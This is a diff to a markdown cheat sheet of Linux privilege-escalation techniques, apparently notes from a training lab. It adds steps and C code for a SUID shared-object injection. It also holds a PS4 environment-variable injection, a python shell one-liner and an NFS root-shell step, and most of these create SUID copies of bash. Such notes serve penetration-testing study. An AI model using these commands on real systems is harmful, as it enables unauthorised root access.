@@ -57,7 +57,7 @@ https://github.com/DominicBreuker/pspy
 
 ```
 ### SUID / SGID Executables - Abusing Shell Features (#2)
-Note: This will not work on Bash versions 4.4 and above.
+```Note: This will not work on Bash versions 4.4 and above.
 
 When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
 Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
@@ -67,7 +67,43 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
 
 /tmp/rootbash -p
+```
 
+```
+Detection
+
+Linux VM
+
+1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
+2. From the output, make note of all the SUID binaries.
+3. In command line type:
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+4. From the output, notice that a .so file is missing from a writable directory.
+
+Exploitation
+
+Linux VM
+
+5. In command prompt type: mkdir /home/user/.config
+6. In command prompt type: cd /home/user/.config
+7. Open a text editor and type:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+
+8. Save the file as libcalc.c
+9. In command prompt type:
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+10. In command prompt type: /usr/local/bin/suid-so
+11. In command prompt type: id
+```
+```
 ---------------------------------------------
 python -c 'import os;os.execl("/bin/sh","sh","-p")'
 ------------------------------------------------
@@ -93,7 +129,7 @@ chmod +xs /tmp/nfs/shell.elf
 
 Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
 /tmp/shell.elf
-
+```
 
 
 SMB:
